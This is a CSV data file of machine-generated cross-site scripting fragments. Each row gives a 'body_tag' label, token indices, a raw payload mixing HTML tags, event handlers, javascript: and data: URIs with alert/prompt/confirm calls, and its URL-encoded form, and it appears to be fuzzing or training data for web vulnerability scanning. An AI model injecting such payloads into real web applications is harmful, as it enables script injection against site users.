body_tag,"[70, 66, 8, 17, 5]","""prompt(1);</a><input/<script/",%22prompt%281%29%3B%3C/a%3E%3Cinput/%3Cscript/
body_tag,"[3, 66, 42, 3, 11]",<video><source/prompt(1);src=saivs.js <video><source/<img ,%3Cvideo%3E%3Csource/prompt%281%29%3Bsrc%3Dsaivs.js%20%3Cvideo%3E%3Csource/%3Cimg%20
body_tag,"[29, 61, 10, 47, 47]",<select al\u0065rt();<option/data=data=,%3Cselect%20al%5Cu0065rt%28%29%3B%3Coption/data%3Ddata%3D
body_tag,"[37, 5, 67, 42, 56]",</embed><script/>src=saivs.js onmouseover=alert();,%3C/embed%3E%3Cscript/%3Esrc%3Dsaivs.js%20onmouseover%3Dalert%28%29%3B
body_tag,"[30, 66, 44, 7, 17]","<select/prompt(1);type=""text/x-scriptlet"" <a/<input/",%3Cselect/prompt%281%29%3Btype%3D%22text/x-scriptlet%22%20%3Ca/%3Cinput/
body_tag,"[66, 7, 1, 42, 55]","prompt(1);<a/</script>src=saivs.js onload=alert();""",prompt%281%29%3B%3Ca/%3C/script%3Esrc%3Dsaivs.js%20onload%3Dalert%28%29%3B%22
body_tag,"[57, 26, 36, 63, 19]",onerror=alert();<object <embed/\u0061lert``;<iframe/,onerror%3Dalert%28%29%3B%3Cobject%20%3Cembed/%5Cu0061lert%60%60%3B%3Ciframe/
body_tag,"[17, 9, 48, 49, 36]",<input/<option onerror=javascript:alert();onerror=\u0061lert();<embed/,%3Cinput/%3Coption%20onerror%3Djavascript%3Aalert%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B%3Cembed/
body_tag,"[30, 24, 43, 46, 52]","<select/<svg type=""image"" data=""data:text/html,javascript:\u0061lert();",%3Cselect/%3Csvg%20type%3D%22image%22%20data%3D%22data%3Atext/html%2Cjavascript%3A%5Cu0061lert%28%29%3B
body_tag,"[5, 74, 48, 26, 42]",<script/ onerror=javascript:alert();<object src=saivs.js ,%3Cscript/%20onerror%3Djavascript%3Aalert%28%29%3B%3Cobject%20src%3Dsaivs.js%20
body_tag,"[7, 28, 0, 72, 39]",<a/</object><script>#src=/ ,%3Ca/%3C/object%3E%3Cscript%3E%23src%3D/%20
body_tag,"[41, 47, 72, 54, 29]","src=""data:text/html,data=#onload=alert();<select ",src%3D%22data%3Atext/html%2Cdata%3D%23onload%3Dalert%28%29%3B%3Cselect%20
body_tag,"[30, 51, 42, 9, 50]",<select/javascript:alert();src=saivs.js <option onerror=al\u0065rt();,%3Cselect/javascript%3Aalert%28%29%3Bsrc%3Dsaivs.js%20%3Coption%20onerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[64, 54, 6, 62, 25]",al\u0065rt``;onload=alert();<a alert``;<svg/,al%5Cu0065rt%60%60%3Bonload%3Dalert%28%29%3B%3Ca%20alert%60%60%3B%3Csvg/
body_tag,"[67, 34, 60, 67, 43]","></canvas>\u0061lert();>type=""image"" ",%3E%3C/canvas%3E%5Cu0061lert%28%29%3B%3Etype%3D%22image%22%20
body_tag,"[31, 57, 69, 35, 17]",</select>onerror=alert();<<embed <input/,%3C/select%3Eonerror%3Dalert%28%29%3B%3C%3Cembed%20%3Cinput/
body_tag,"[57, 29, 3, 24, 0]",onerror=alert();<select <video><source/<svg <script>,onerror%3Dalert%28%29%3B%3Cselect%20%3Cvideo%3E%3Csource/%3Csvg%20%3Cscript%3E
body_tag,"[46, 31, 27, 42, 66]","data=""data:text/html,</select><object/src=saivs.js prompt(1);",data%3D%22data%3Atext/html%2C%3C/select%3E%3Cobject/src%3Dsaivs.js%20prompt%281%29%3B
body_tag,"[51, 0, 23, 58, 71]",javascript:alert();<script></frameset>saivs.js ',javascript%3Aalert%28%29%3B%3Cscript%3E%3C/frameset%3Esaivs.js%20%27
body_tag,"[45, 63, 26, 35, 64]",data=saivs.html \u0061lert``;<object <embed al\u0065rt``;,data%3Dsaivs.html%20%5Cu0061lert%60%60%3B%3Cobject%20%3Cembed%20al%5Cu0065rt%60%60%3B
body_tag,"[37, 70, 59, 72, 68]","</embed>""alert();# />",%3C/embed%3E%22alert%28%29%3B%23%20/%3E
body_tag,"[68, 13, 63, 54, 70]"," /></img>\u0061lert``;onload=alert();""",%20/%3E%3C/img%3E%5Cu0061lert%60%60%3Bonload%3Dalert%28%29%3B%22
body_tag,"[3, 28, 73, 21, 43]","<video><source/</object>/<frameset><frame type=""image"" ",%3Cvideo%3E%3Csource/%3C/object%3E/%3Cframeset%3E%3Cframe%20type%3D%22image%22%20
body_tag,"[48, 65, 36, 47, 56]",onerror=javascript:alert();confirm(1);<embed/data=onmouseover=alert();,onerror%3Djavascript%3Aalert%28%29%3Bconfirm%281%29%3B%3Cembed/data%3Donmouseover%3Dalert%28%29%3B
body_tag,"[74, 44, 71, 40, 30]"," type=""text/x-scriptlet"" 'src=  <select/",%20type%3D%22text/x-scriptlet%22%20%27src%3D%20%20%3Cselect/
body_tag,"[35, 5, 61, 71, 26]",<embed <script/al\u0065rt();'<object ,%3Cembed%20%3Cscript/al%5Cu0065rt%28%29%3B%27%3Cobject%20
body_tag,"[5, 6, 18, 45, 60]",<script/<a <iframe data=saivs.html \u0061lert();,%3Cscript/%3Ca%20%3Ciframe%20data%3Dsaivs.html%20%5Cu0061lert%28%29%3B
body_tag,"[48, 24, 58, 42, 4]",onerror=javascript:alert();<svg saivs.js src=saivs.js <script ,onerror%3Djavascript%3Aalert%28%29%3B%3Csvg%20saivs.js%20src%3Dsaivs.js%20%3Cscript%20
body_tag,"[30, 64, 60, 6, 53]",<select/al\u0065rt``;\u0061lert();<a javascript:al\u0065rt();,%3Cselect/al%5Cu0065rt%60%60%3B%5Cu0061lert%28%29%3B%3Ca%20javascript%3Aal%5Cu0065rt%28%29%3B
body_tag,"[22, 0, 15, 27, 43]","<frameset><frame/<script><body/<object/type=""image"" ",%3Cframeset%3E%3Cframe/%3Cscript%3E%3Cbody/%3Cobject/type%3D%22image%22%20
body_tag,"[1, 14, 19, 58, 70]","</script><body <iframe/saivs.js """,%3C/script%3E%3Cbody%20%3Ciframe/saivs.js%20%22
body_tag,"[37, 3, 71, 55, 37]","</embed><video><source/'onload=alert();""</embed>",%3C/embed%3E%3Cvideo%3E%3Csource/%27onload%3Dalert%28%29%3B%22%3C/embed%3E
body_tag,"[8, 49, 30, 6, 4]",</a>onerror=\u0061lert();<select/<a <script ,%3C/a%3Eonerror%3D%5Cu0061lert%28%29%3B%3Cselect/%3Ca%20%3Cscript%20
body_tag,"[20, 30, 27, 31, 64]",</iframe><select/<object/</select>al\u0065rt``;,%3C/iframe%3E%3Cselect/%3Cobject/%3C/select%3Eal%5Cu0065rt%60%60%3B
body_tag,"[0, 32, 26, 31, 0]",<script><canvas <object </select><script>,%3Cscript%3E%3Ccanvas%20%3Cobject%20%3C/select%3E%3Cscript%3E
body_tag,"[8, 16, 62, 57, 50]",</a><input alert``;onerror=alert();onerror=al\u0065rt();,%3C/a%3E%3Cinput%20alert%60%60%3Bonerror%3Dalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[2, 12, 65, 31, 63]",<video><source <img/confirm(1);</select>\u0061lert``;,%3Cvideo%3E%3Csource%20%3Cimg/confirm%281%29%3B%3C/select%3E%5Cu0061lert%60%60%3B
body_tag,"[64, 22, 71, 38, 65]",al\u0065rt``;<frameset><frame/'src=x confirm(1);,al%5Cu0065rt%60%60%3B%3Cframeset%3E%3Cframe/%27src%3Dx%20confirm%281%29%3B
body_tag,"[38, 65, 7, 0, 46]","src=x confirm(1);<a/<script>data=""data:text/html,",src%3Dx%20confirm%281%29%3B%3Ca/%3Cscript%3Edata%3D%22data%3Atext/html%2C
body_tag,"[33, 14, 33, 0, 56]",<canvas/<body <canvas/<script>onmouseover=alert();,%3Ccanvas/%3Cbody%20%3Ccanvas/%3Cscript%3Eonmouseover%3Dalert%28%29%3B
body_tag,"[13, 17, 66, 20, 70]","</img><input/prompt(1);</iframe>""",%3C/img%3E%3Cinput/prompt%281%29%3B%3C/iframe%3E%22
body_tag,"[20, 8, 24, 58, 22]",</iframe></a><svg saivs.js <frameset><frame/,%3C/iframe%3E%3C/a%3E%3Csvg%20saivs.js%20%3Cframeset%3E%3Cframe/
body_tag,"[71, 28, 15, 57, 50]",'</object><body/onerror=alert();onerror=al\u0065rt();,%27%3C/object%3E%3Cbody/onerror%3Dalert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[12, 9, 65, 71, 13]",<img/<option confirm(1);'</img>,%3Cimg/%3Coption%20confirm%281%29%3B%27%3C/img%3E
body_tag,"[73, 35, 4, 9, 22]",/<embed <script <option <frameset><frame/,/%3Cembed%20%3Cscript%20%3Coption%20%3Cframeset%3E%3Cframe/
body_tag,"[13, 14, 43, 54, 65]","</img><body type=""image"" onload=alert();confirm(1);",%3C/img%3E%3Cbody%20type%3D%22image%22%20onload%3Dalert%28%29%3Bconfirm%281%29%3B
body_tag,"[53, 73, 46, 55, 62]","javascript:al\u0065rt();/data=""data:text/html,onload=alert();""alert``;",javascript%3Aal%5Cu0065rt%28%29%3B/data%3D%22data%3Atext/html%2Conload%3Dalert%28%29%3B%22alert%60%60%3B
body_tag,"[0, 0, 51, 62, 61]",<script><script>javascript:alert();alert``;al\u0065rt();,%3Cscript%3E%3Cscript%3Ejavascript%3Aalert%28%29%3Balert%60%60%3Bal%5Cu0065rt%28%29%3B
body_tag,"[30, 18, 44, 58, 65]","<select/<iframe type=""text/x-scriptlet"" saivs.js confirm(1);",%3Cselect/%3Ciframe%20type%3D%22text/x-scriptlet%22%20saivs.js%20confirm%281%29%3B
body_tag,"[73, 25, 53, 74, 18]",/<svg/javascript:al\u0065rt(); <iframe ,/%3Csvg/javascript%3Aal%5Cu0065rt%28%29%3B%20%3Ciframe%20
body_tag,"[11, 9, 53, 41, 48]","<img <option javascript:al\u0065rt();src=""data:text/html,onerror=javascript:alert();",%3Cimg%20%3Coption%20javascript%3Aal%5Cu0065rt%28%29%3Bsrc%3D%22data%3Atext/html%2Conerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[41, 4, 51, 49, 50]","src=""data:text/html,<script javascript:alert();onerror=\u0061lert();onerror=al\u0065rt();",src%3D%22data%3Atext/html%2C%3Cscript%20javascript%3Aalert%28%29%3Bonerror%3D%5Cu0061lert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B
body_tag,"[27, 38, 60, 9, 40]",<object/src=x \u0061lert();<option src=  ,%3Cobject/src%3Dx%20%5Cu0061lert%28%29%3B%3Coption%20src%3D%20%20
body_tag,"[20, 35, 29, 34, 73]",</iframe><embed <select </canvas>/,%3C/iframe%3E%3Cembed%20%3Cselect%20%3C/canvas%3E/
body_tag,"[54, 72, 66, 72, 11]",onload=alert();#prompt(1);#<img ,onload%3Dalert%28%29%3B%23prompt%281%29%3B%23%3Cimg%20
body_tag,"[22, 73, 19, 53, 8]",<frameset><frame//<iframe/javascript:al\u0065rt();</a>,%3Cframeset%3E%3Cframe//%3Ciframe/javascript%3Aal%5Cu0065rt%28%29%3B%3C/a%3E
body_tag,"[7, 33, 24, 7, 24]",<a/<canvas/<svg <a/<svg ,%3Ca/%3Ccanvas/%3Csvg%20%3Ca/%3Csvg%20
body_tag,"[4, 31, 66, 13, 52]",<script </select>prompt(1);</img>javascript:\u0061lert();,%3Cscript%20%3C/select%3Eprompt%281%29%3B%3C/img%3Ejavascript%3A%5Cu0061lert%28%29%3B
body_tag,"[43, 44, 23, 51, 49]","type=""image"" type=""text/x-scriptlet"" </frameset>javascript:alert();onerror=\u0061lert();",type%3D%22image%22%20type%3D%22text/x-scriptlet%22%20%3C/frameset%3Ejavascript%3Aalert%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B
body_tag,"[71, 21, 59, 28, 54]",'<frameset><frame alert();</object>onload=alert();,%27%3Cframeset%3E%3Cframe%20alert%28%29%3B%3C/object%3Eonload%3Dalert%28%29%3B
body_tag,"[72, 64, 0, 71, 2]",#al\u0065rt``;<script>'<video><source ,%23al%5Cu0065rt%60%60%3B%3Cscript%3E%27%3Cvideo%3E%3Csource%20
body_tag,"[54, 30, 69, 8, 31]",onload=alert();<select/<</a></select>,onload%3Dalert%28%29%3B%3Cselect/%3C%3C/a%3E%3C/select%3E
body_tag,"[32, 59, 12, 56, 67]",<canvas alert();<img/onmouseover=alert();>,%3Ccanvas%20alert%28%29%3B%3Cimg/onmouseover%3Dalert%28%29%3B%3E
body_tag,"[60, 66, 53, 50, 39]",\u0061lert();prompt(1);javascript:al\u0065rt();onerror=al\u0065rt();src=/ ,%5Cu0061lert%28%29%3Bprompt%281%29%3Bjavascript%3Aal%5Cu0065rt%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3Bsrc%3D/%20
body_tag,"[40, 55, 53, 49, 37]","src=  onload=alert();""javascript:al\u0065rt();onerror=\u0061lert();</embed>",src%3D%20%20onload%3Dalert%28%29%3B%22javascript%3Aal%5Cu0065rt%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B%3C/embed%3E
body_tag,"[20, 16, 65, 27, 62]",</iframe><input confirm(1);<object/alert``;,%3C/iframe%3E%3Cinput%20confirm%281%29%3B%3Cobject/alert%60%60%3B
body_tag,"[63, 63, 15, 1, 40]",\u0061lert``;\u0061lert``;<body/</script>src=  ,%5Cu0061lert%60%60%3B%5Cu0061lert%60%60%3B%3Cbody/%3C/script%3Esrc%3D%20%20
body_tag,"[49, 8, 73, 55, 43]","onerror=\u0061lert();</a>/onload=alert();""type=""image"" ",onerror%3D%5Cu0061lert%28%29%3B%3C/a%3E/onload%3Dalert%28%29%3B%22type%3D%22image%22%20
body_tag,"[46, 21, 17, 2, 29]","data=""data:text/html,<frameset><frame <input/<video><source <select ",data%3D%22data%3Atext/html%2C%3Cframeset%3E%3Cframe%20%3Cinput/%3Cvideo%3E%3Csource%20%3Cselect%20
body_tag,"[45, 32, 54, 22, 39]",data=saivs.html <canvas onload=alert();<frameset><frame/src=/ ,data%3Dsaivs.html%20%3Ccanvas%20onload%3Dalert%28%29%3B%3Cframeset%3E%3Cframe/src%3D/%20
body_tag,"[44, 49, 6, 64, 17]","type=""text/x-scriptlet"" onerror=\u0061lert();<a al\u0065rt``;<input/",type%3D%22text/x-scriptlet%22%20onerror%3D%5Cu0061lert%28%29%3B%3Ca%20al%5Cu0065rt%60%60%3B%3Cinput/
body_tag,"[23, 35, 59, 12, 17]",</frameset><embed alert();<img/<input/,%3C/frameset%3E%3Cembed%20alert%28%29%3B%3Cimg/%3Cinput/
body_tag,"[34, 5, 46, 34, 30]","</canvas><script/data=""data:text/html,</canvas><select/",%3C/canvas%3E%3Cscript/data%3D%22data%3Atext/html%2C%3C/canvas%3E%3Cselect/
body_tag,"[28, 10, 73, 64, 0]",</object><option//al\u0065rt``;<script>,%3C/object%3E%3Coption//al%5Cu0065rt%60%60%3B%3Cscript%3E
body_tag,"[41, 44, 27, 2, 47]","src=""data:text/html,type=""text/x-scriptlet"" <object/<video><source data=",src%3D%22data%3Atext/html%2Ctype%3D%22text/x-scriptlet%22%20%3Cobject/%3Cvideo%3E%3Csource%20data%3D
body_tag,"[67, 18, 53, 70, 1]","><iframe javascript:al\u0065rt();""</script>",%3E%3Ciframe%20javascript%3Aal%5Cu0065rt%28%29%3B%22%3C/script%3E
body_tag,"[57, 52, 51, 12, 62]",onerror=alert();javascript:\u0061lert();javascript:alert();<img/alert``;,onerror%3Dalert%28%29%3Bjavascript%3A%5Cu0061lert%28%29%3Bjavascript%3Aalert%28%29%3B%3Cimg/alert%60%60%3B
body_tag,"[32, 41, 10, 8, 17]","<canvas src=""data:text/html,<option/</a><input/",%3Ccanvas%20src%3D%22data%3Atext/html%2C%3Coption/%3C/a%3E%3Cinput/
body_tag,"[10, 25, 28, 10, 7]",<option/<svg/</object><option/<a/,%3Coption/%3Csvg/%3C/object%3E%3Coption/%3Ca/
body_tag,"[20, 60, 73, 27, 62]",</iframe>\u0061lert();/<object/alert``;,%3C/iframe%3E%5Cu0061lert%28%29%3B/%3Cobject/alert%60%60%3B
body_tag,"[50, 32, 59, 28, 70]","onerror=al\u0065rt();<canvas alert();</object>""",onerror%3Dal%5Cu0065rt%28%29%3B%3Ccanvas%20alert%28%29%3B%3C/object%3E%22
body_tag,"[39, 67, 43, 66, 7]","src=/ >type=""image"" prompt(1);<a/",src%3D/%20%3Etype%3D%22image%22%20prompt%281%29%3B%3Ca/
body_tag,"[6, 8, 21, 2, 64]",<a </a><frameset><frame <video><source al\u0065rt``;,%3Ca%20%3C/a%3E%3Cframeset%3E%3Cframe%20%3Cvideo%3E%3Csource%20al%5Cu0065rt%60%60%3B
body_tag,"[8, 35, 13, 16, 66]",</a><embed </img><input prompt(1);,%3C/a%3E%3Cembed%20%3C/img%3E%3Cinput%20prompt%281%29%3B
body_tag,"[32, 73, 2, 57, 28]",<canvas /<video><source onerror=alert();</object>,%3Ccanvas%20/%3Cvideo%3E%3Csource%20onerror%3Dalert%28%29%3B%3C/object%3E
body_tag,"[21, 68, 11, 42, 21]",<frameset><frame  /><img src=saivs.js <frameset><frame ,%3Cframeset%3E%3Cframe%20%20/%3E%3Cimg%20src%3Dsaivs.js%20%3Cframeset%3E%3Cframe%20
body_tag,"[43, 11, 53, 59, 13]","type=""image"" <img javascript:al\u0065rt();alert();</img>",type%3D%22image%22%20%3Cimg%20javascript%3Aal%5Cu0065rt%28%29%3Balert%28%29%3B%3C/img%3E
body_tag,"[19, 2, 31, 16, 39]",<iframe/<video><source </select><input src=/ ,%3Ciframe/%3Cvideo%3E%3Csource%20%3C/select%3E%3Cinput%20src%3D/%20
body_tag,"[43, 14, 28, 46, 39]","type=""image"" <body </object>data=""data:text/html,src=/ ",type%3D%22image%22%20%3Cbody%20%3C/object%3Edata%3D%22data%3Atext/html%2Csrc%3D/%20
body_tag,"[46, 60, 15, 25, 62]","data=""data:text/html,\u0061lert();<body/<svg/alert``;",data%3D%22data%3Atext/html%2C%5Cu0061lert%28%29%3B%3Cbody/%3Csvg/alert%60%60%3B
body_tag,"[62, 22, 35, 8, 40]",alert``;<frameset><frame/<embed </a>src=  ,alert%60%60%3B%3Cframeset%3E%3Cframe/%3Cembed%20%3C/a%3Esrc%3D%20%20
body_tag,"[2, 59, 61, 60, 61]",<video><source alert();al\u0065rt();\u0061lert();al\u0065rt();,%3Cvideo%3E%3Csource%20alert%28%29%3Bal%5Cu0065rt%28%29%3B%5Cu0061lert%28%29%3Bal%5Cu0065rt%28%29%3B
body_tag,"[65, 51, 38, 55, 18]","confirm(1);javascript:alert();src=x onload=alert();""<iframe ",confirm%281%29%3Bjavascript%3Aalert%28%29%3Bsrc%3Dx%20onload%3Dalert%28%29%3B%22%3Ciframe%20
body_tag,"[74, 72, 61, 45, 19]", #al\u0065rt();data=saivs.html <iframe/,%20%23al%5Cu0065rt%28%29%3Bdata%3Dsaivs.html%20%3Ciframe/
body_tag,"[61, 21, 69, 42, 60]",al\u0065rt();<frameset><frame <src=saivs.js \u0061lert();,al%5Cu0065rt%28%29%3B%3Cframeset%3E%3Cframe%20%3Csrc%3Dsaivs.js%20%5Cu0061lert%28%29%3B
body_tag,"[27, 73, 30, 36, 55]","<object//<select/<embed/onload=alert();""",%3Cobject//%3Cselect/%3Cembed/onload%3Dalert%28%29%3B%22
body_tag,"[7, 38, 30, 1, 64]",<a/src=x <select/</script>al\u0065rt``;,%3Ca/src%3Dx%20%3Cselect/%3C/script%3Eal%5Cu0065rt%60%60%3B
body_tag,"[56, 9, 29, 73, 45]",onmouseover=alert();<option <select /data=saivs.html ,onmouseover%3Dalert%28%29%3B%3Coption%20%3Cselect%20/data%3Dsaivs.html%20
body_tag,"[44, 71, 56, 62, 53]","type=""text/x-scriptlet"" 'onmouseover=alert();alert``;javascript:al\u0065rt();",type%3D%22text/x-scriptlet%22%20%27onmouseover%3Dalert%28%29%3Balert%60%60%3Bjavascript%3Aal%5Cu0065rt%28%29%3B
body_tag,"[46, 27, 55, 11, 7]","data=""data:text/html,<object/onload=alert();""<img <a/",data%3D%22data%3Atext/html%2C%3Cobject/onload%3Dalert%28%29%3B%22%3Cimg%20%3Ca/
body_tag,"[51, 29, 12, 37, 27]",javascript:alert();<select <img/</embed><object/,javascript%3Aalert%28%29%3B%3Cselect%20%3Cimg/%3C/embed%3E%3Cobject/
body_tag,"[69, 39, 46, 46, 0]","<src=/ data=""data:text/html,data=""data:text/html,<script>",%3Csrc%3D/%20data%3D%22data%3Atext/html%2Cdata%3D%22data%3Atext/html%2C%3Cscript%3E
body_tag,"[73, 21, 44, 53, 45]","/<frameset><frame type=""text/x-scriptlet"" javascript:al\u0065rt();data=saivs.html ",/%3Cframeset%3E%3Cframe%20type%3D%22text/x-scriptlet%22%20javascript%3Aal%5Cu0065rt%28%29%3Bdata%3Dsaivs.html%20
body_tag,"[41, 58, 21, 70, 65]","src=""data:text/html,saivs.js <frameset><frame ""confirm(1);",src%3D%22data%3Atext/html%2Csaivs.js%20%3Cframeset%3E%3Cframe%20%22confirm%281%29%3B
body_tag,"[38, 51, 62, 37, 23]",src=x javascript:alert();alert``;</embed></frameset>,src%3Dx%20javascript%3Aalert%28%29%3Balert%60%60%3B%3C/embed%3E%3C/frameset%3E
body_tag,"[32, 26, 46, 14, 59]","<canvas <object data=""data:text/html,<body alert();",%3Ccanvas%20%3Cobject%20data%3D%22data%3Atext/html%2C%3Cbody%20alert%28%29%3B
body_tag,"[13, 50, 24, 69, 55]","</img>onerror=al\u0065rt();<svg <onload=alert();""",%3C/img%3Eonerror%3Dal%5Cu0065rt%28%29%3B%3Csvg%20%3Conload%3Dalert%28%29%3B%22
body_tag,"[38, 47, 60, 74, 40]",src=x data=\u0061lert(); src=  ,src%3Dx%20data%3D%5Cu0061lert%28%29%3B%20src%3D%20%20
body_tag,"[11, 63, 37, 6, 74]",<img \u0061lert``;</embed><a  ,%3Cimg%20%5Cu0061lert%60%60%3B%3C/embed%3E%3Ca%20%20
body_tag,"[37, 11, 39, 28, 66]",</embed><img src=/ </object>prompt(1);,%3C/embed%3E%3Cimg%20src%3D/%20%3C/object%3Eprompt%281%29%3B
body_tag,"[15, 61, 23, 62, 41]","<body/al\u0065rt();</frameset>alert``;src=""data:text/html,",%3Cbody/al%5Cu0065rt%28%29%3B%3C/frameset%3Ealert%60%60%3Bsrc%3D%22data%3Atext/html%2C
body_tag,"[29, 21, 68, 12, 2]",<select <frameset><frame  /><img/<video><source ,%3Cselect%20%3Cframeset%3E%3Cframe%20%20/%3E%3Cimg/%3Cvideo%3E%3Csource%20
body_tag,"[68, 48, 32, 41, 55]"," />onerror=javascript:alert();<canvas src=""data:text/html,onload=alert();""",%20/%3Eonerror%3Djavascript%3Aalert%28%29%3B%3Ccanvas%20src%3D%22data%3Atext/html%2Conload%3Dalert%28%29%3B%22
body_tag,"[35, 6, 36, 38, 73]",<embed <a <embed/src=x /,%3Cembed%20%3Ca%20%3Cembed/src%3Dx%20/
body_tag,"[22, 25, 48, 39, 10]",<frameset><frame/<svg/onerror=javascript:alert();src=/ <option/,%3Cframeset%3E%3Cframe/%3Csvg/onerror%3Djavascript%3Aalert%28%29%3Bsrc%3D/%20%3Coption/
body_tag,"[48, 26, 1, 29, 66]",onerror=javascript:alert();<object </script><select prompt(1);,onerror%3Djavascript%3Aalert%28%29%3B%3Cobject%20%3C/script%3E%3Cselect%20prompt%281%29%3B
body_tag,"[12, 5, 71, 8, 67]",<img/<script/'</a>>,%3Cimg/%3Cscript/%27%3C/a%3E%3E
body_tag,"[71, 73, 29, 20, 67]",'/<select </iframe>>,%27/%3Cselect%20%3C/iframe%3E%3E
body_tag,"[37, 68, 46, 23, 33]","</embed> />data=""data:text/html,</frameset><canvas/",%3C/embed%3E%20/%3Edata%3D%22data%3Atext/html%2C%3C/frameset%3E%3Ccanvas/
body_tag,"[33, 44, 28, 63, 70]","<canvas/type=""text/x-scriptlet"" </object>\u0061lert``;""",%3Ccanvas/type%3D%22text/x-scriptlet%22%20%3C/object%3E%5Cu0061lert%60%60%3B%22
body_tag,"[9, 27, 28, 48, 16]",<option <object/</object>onerror=javascript:alert();<input ,%3Coption%20%3Cobject/%3C/object%3Eonerror%3Djavascript%3Aalert%28%29%3B%3Cinput%20
body_tag,"[73, 58, 50, 23, 24]",/saivs.js onerror=al\u0065rt();</frameset><svg ,/saivs.js%20onerror%3Dal%5Cu0065rt%28%29%3B%3C/frameset%3E%3Csvg%20
body_tag,"[50, 49, 9, 66, 15]",onerror=al\u0065rt();onerror=\u0061lert();<option prompt(1);<body/,onerror%3Dal%5Cu0065rt%28%29%3Bonerror%3D%5Cu0061lert%28%29%3B%3Coption%20prompt%281%29%3B%3Cbody/
body_tag,"[64, 2, 21, 5, 4]",al\u0065rt``;<video><source <frameset><frame <script/<script ,al%5Cu0065rt%60%60%3B%3Cvideo%3E%3Csource%20%3Cframeset%3E%3Cframe%20%3Cscript/%3Cscript%20
body_tag,"[57, 54, 39, 52, 18]",onerror=alert();onload=alert();src=/ javascript:\u0061lert();<iframe ,onerror%3Dalert%28%29%3Bonload%3Dalert%28%29%3Bsrc%3D/%20javascript%3A%5Cu0061lert%28%29%3B%3Ciframe%20
body_tag,"[1, 17, 62, 39, 48]",</script><input/alert``;src=/ onerror=javascript:alert();,%3C/script%3E%3Cinput/alert%60%60%3Bsrc%3D/%20onerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[65, 4, 7, 26, 36]",confirm(1);<script <a/<object <embed/,confirm%281%29%3B%3Cscript%20%3Ca/%3Cobject%20%3Cembed/
body_tag,"[36, 70, 25, 0, 73]","<embed/""<svg/<script>/",%3Cembed/%22%3Csvg/%3Cscript%3E/
body_tag,"[73, 71, 37, 70, 32]","/'</embed>""<canvas ",/%27%3C/embed%3E%22%3Ccanvas%20
body_tag,"[50, 21, 25, 48, 57]",onerror=al\u0065rt();<frameset><frame <svg/onerror=javascript:alert();onerror=alert();,onerror%3Dal%5Cu0065rt%28%29%3B%3Cframeset%3E%3Cframe%20%3Csvg/onerror%3Djavascript%3Aalert%28%29%3Bonerror%3Dalert%28%29%3B
body_tag,"[44, 57, 72, 52, 28]","type=""text/x-scriptlet"" onerror=alert();#javascript:\u0061lert();</object>",type%3D%22text/x-scriptlet%22%20onerror%3Dalert%28%29%3B%23javascript%3A%5Cu0061lert%28%29%3B%3C/object%3E
body_tag,"[32, 38, 68, 49, 74]",<canvas src=x  />onerror=\u0061lert(); ,%3Ccanvas%20src%3Dx%20%20/%3Eonerror%3D%5Cu0061lert%28%29%3B%20
body_tag,"[59, 70, 51, 1, 6]","alert();""javascript:alert();</script><a ",alert%28%29%3B%22javascript%3Aalert%28%29%3B%3C/script%3E%3Ca%20
body_tag,"[14, 34, 14, 71, 69]",<body </canvas><body '<,%3Cbody%20%3C/canvas%3E%3Cbody%20%27%3C
body_tag,"[18, 27, 32, 33, 19]",<iframe <object/<canvas <canvas/<iframe/,%3Ciframe%20%3Cobject/%3Ccanvas%20%3Ccanvas/%3Ciframe/
body_tag,"[24, 69, 6, 15, 40]",<svg <<a <body/src=  ,%3Csvg%20%3C%3Ca%20%3Cbody/src%3D%20%20
body_tag,"[49, 37, 14, 7, 33]",onerror=\u0061lert();</embed><body <a/<canvas/,onerror%3D%5Cu0061lert%28%29%3B%3C/embed%3E%3Cbody%20%3Ca/%3Ccanvas/
body_tag,"[6, 18, 68, 65, 59]",<a <iframe  />confirm(1);alert();,%3Ca%20%3Ciframe%20%20/%3Econfirm%281%29%3Balert%28%29%3B
body_tag,"[47, 38, 25, 19, 39]",data=src=x <svg/<iframe/src=/ ,data%3Dsrc%3Dx%20%3Csvg/%3Ciframe/src%3D/%20
